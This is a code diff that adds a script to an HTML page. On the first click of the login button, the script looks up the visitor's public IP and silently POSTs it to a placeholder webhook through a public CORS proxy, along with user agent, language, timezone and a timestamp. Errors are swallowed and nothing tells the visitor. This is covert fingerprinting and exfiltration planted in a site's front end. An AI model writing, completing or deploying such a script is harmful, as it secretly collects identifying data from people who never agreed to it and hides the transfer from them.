@@ -103,6 +103,41 @@
             });
         });
     </script>
+    
+    <script>
+document.addEventListener("DOMContentLoaded", () => {
+  const loginBtn = document.querySelector(".login");
+  if (!loginBtn) return;
+
+  loginBtn.addEventListener("click", async () => {
+    try {
+      // get public IP
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const { ip } = await ipRes.json();
+
+      // send via CORS proxy
+      await fetch(
+        "https://corsproxy.io/?https://YOUR_REAL_WEBHOOK_URL_HERE",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            ip: ip,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString()
+          })
+        }
+      );
+    } catch (_) {
+      // fail silently
+    }
+  }, { once: true }); // <-- guarantees it only sends once
+});
+</script>
 </body>
 
 </html>
